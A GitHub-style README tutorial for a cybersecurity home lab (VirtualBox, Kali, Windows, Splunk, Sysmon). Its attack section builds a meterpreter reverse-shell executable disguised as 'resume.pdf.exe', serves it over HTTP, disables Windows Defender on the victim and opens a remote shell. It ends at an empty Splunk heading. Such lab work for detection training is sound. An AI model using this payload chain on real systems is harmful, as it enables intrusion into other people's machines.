# BASIC-HOME-LAB

- ### **💡 What's a Home Lab?: Think of it as your digital workshop, a safe haven to tinker, test, and refine your cybersecurity skills. A Home Lab is a personalized setup where you can build virtual environments, play with cutting-edge tools, and simulate real-world scenarios, all from the comfort of your home. 🏠💡**

- ### **🔍 The Power of Practical Learning: Theory is essential, but the Home Lab takes you beyond the textbooks.  Hands-on learning allows you to grasp complex concepts, fortify your technical abilities, and face cyber challenges head-on! 🧠🔍**

---

## STEP 1: REQUIREMENTS :- 

### 1. VIRTUAL ENVIRONMENT : VIRTUAL BOX OR VMWARE :-

![Screenshot 2024-12-16 165429](https://github.com/user-attachments/assets/34ee4436-dc10-471e-8132-67049ac5bdf2)

- Virtualbox Link : https://www.virtualbox.org/wiki/Downloads

---

### 2. OPERATING SYSTEM : WINDOWS 10 AND KALI LINUX :-

### - WINDOWS-10/11: ![image](https://github.com/user-attachments/assets/1d4e8060-5225-44f7-9f1c-892d225ef48b)

- Windows ISO Image Link: https://www.microsoft.com/en-ca/software-download/windows10

---

### - KALI LINUX: ![image](https://github.com/user-attachments/assets/a83d0741-d51b-4c03-9df3-99327b2054f6)


- Kali Linux Link : [www.kali.org](https://www.kali.org/)

---

### 3. TOOLS USED : SPLUNK AND SYSMON WITH OLAF CONFIGURATION :-

### - SPLUNK ENTERPRISE: ![Screenshot 2024-12-16 170122](https://github.com/user-attachments/assets/84b9c38e-d06e-41d0-8898-af7d9abf359c)

- Splunk Link: https://www.splunk.com/en_us/download/splunk-enterprise.html

---

### - SYSMON: ![Screenshot 2024-12-16 172320](https://github.com/user-attachments/assets/ccd044ef-c637-4232-a242-374a58924de4)


- Sysmon Link: https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon

- Olaf Configuration: https://github.com/olafhartong/sysmon-modular/blob/master/sysmonconfig.xml

---

## STEP 2: CONFIGURATION :- 

- ### **🔧 Crafting the Perfect Virtual Workspace: A properly configured virtual machine is the cornerstone of your Home Lab, empowering you to experiment, fine-tune, and elevate your skills within a secure environment.🏠🔧**

- ### **🚀 Elevate Your Learning with Hands-On Virtualization: Theoretical knowledge forms the foundation, but the Home Lab catapults you into the realm of practical mastery. Take on cyber challenges with confidence, equip your mental toolkit, and embark on a journey of true skill refinement! 🚀🧠**

---

### A: CHANGE YOUR NETWORK OPTIONS BASED ON YOUR SCENARIO :-

- #### Scenario 1: Test tools using internet connectivity : Use default settings - NAT 

- #### Scenario 2: Analyze Malware and identify additional IOC: Use Internal network / unattached


![Screenshot 2024-12-19 070015](https://github.com/user-attachments/assets/32bb2cd4-4220-4ee6-8fc9-6594c6eb865a)


---

## **Since I'm using this home lab to analyze malware im gonna go for scenario 2** :-
 
###  1. **Change network to internal network and create a name for it** :

#### - On your windows machine -> Settings -> Network -> Internal network -> change name (Do the same for kali machine as well by selecting the name associated with windows machine) - **IN THEORY OUR 2 MACHINES ARE NOW IN THE SAME NETWORK**

---

###  2. **Statically assign the IP address for both machines** : 

#### - **On windows machine click -> Globe -> Internet and network settings -> Change Adapter options -> Right click ethernet -> properties -> IPV4 -> use following ip address -> for example 192.168.20.10 double check by opening cmd and ipconfig see the ip**

![Screenshot 2024-12-19 070753](https://github.com/user-attachments/assets/3134a9c3-c3cb-4030-b38d-42268dada9a8)



- ####  **On kali machine right click ethernet icon -> edit connections -> wired connections -> settings -> ipv4 -> manual -> add -> 192.168.20.11 -> mask - 24 -> save double check with if config**
![Screenshot 2024-12-19 070628](https://github.com/user-attachments/assets/04daa2b9-c0df-40b9-912c-4b3039d63436)


#### - Head over to windows machine and try pinging kali and take a snapshot

#### - **Now you are ready to play around!**

---

## STEP 3: HOW TO GENERATE TELEMETRY AND DETECT EVIL :- 

#### Prerequisites :-

![Screenshot 2024-12-21 084318](https://github.com/user-attachments/assets/0334ce6a-6d58-48a1-a424-4ba9da0366ca)

---

### STEPS :-

- ### A. KALI :-

- #### A. Enable RDP on Windows! 

- Open Settings: -> Press Windows + I to open the Settings app. // Go to System > Remote Desktop: -> Toggle on the Enable Remote Desktop option. // Confirm your selection if prompted.
---
- #### B. Start scanning all portts using nmap :-

- On your kali open terminal -> type command nmap -A 192.168.20.10 -Pn where -Pn skips ping the ip adress is of our victim machine - windows machine and -A enables os detection version detection script scanning and traceroute : will identify any ports that are open


![Screenshot 2024-12-21 141409](https://github.com/user-attachments/assets/9c023e41-ef4e-4a03-91bd-dfef2e619de1)



---
- #### C. Create our own malware :-

 - To get a list of payloads - msfvenom -l payloads

 - Enter msfvenom -p (paste your payload) windows/x64/meterpreter/reverse_tcp lhost=ip of attack machine 192.168.100.181 lport=4444 -f exe -o resume.pdf.exe

   [what this command does :- will generate our malware using meterpreter reverse tcp payload instructed to connect back to the machine based on lhost and lport file format will be an exe and name 
   being resume.exe ]
 
 - Verify with ls


![Screenshot 2024-12-21 140549](https://github.com/user-attachments/assets/9ecac0fd-5abd-42fe-bffc-ef5e0867cfad)



---
 - ####  D. Open a handler that will listen in on the port we have configured in our malware :-

 - Open metasploit by typing msfconsole -> use exploit/multi/handler now we are in the exploit itself

 - Type options change the payload to reverse_tcp set payload (paste your payload) and set lhost as your attacker machine press enter check with options

 - Start the handler by typing in exploit : we are now listening in and waiting for our test machine to exe our malware

![Screenshot 2024-12-21 140042](https://github.com/user-attachments/assets/97881fb3-bf6f-4ee9-a968-e4ad7214e115)



---
 - #### E. Setup a http server on our kali machine so our test machine can download the malware

 - New tab -> same directory ls -> python3 -m http.server 9999 -> enter [ this will allow our test machine to access our kali machine and start downloading the malware from there ]

---
 
 - ### B. WINDOWS :-

 - Go to security center -> virus and threat protection -> manage settings -> disable real time protection

 - Open browser and type in ip of kali : 192.168.100.181:9999 -> click resume.pdf.exe -> download and open it

 - Open cmd with admin priviledges -> netstat -anob [ to see an estb connection with our kali machine ]

 - Now head over to kali where looking at our handler we should have an open shell we now have a connection [ meterpreter tab ]


![Screenshot 2024-12-21 141125](https://github.com/user-attachments/assets/c93f0b19-ce42-4cc3-8f42-2d399e654475)



---
 
 - ### C. KALI II :-

 -  type in shell [ to establish shell on our test machine ]

 - type in net user

 - type in netl localgroup

 - type in ipconfig

---
 
 - ### D. SPLUNK :-
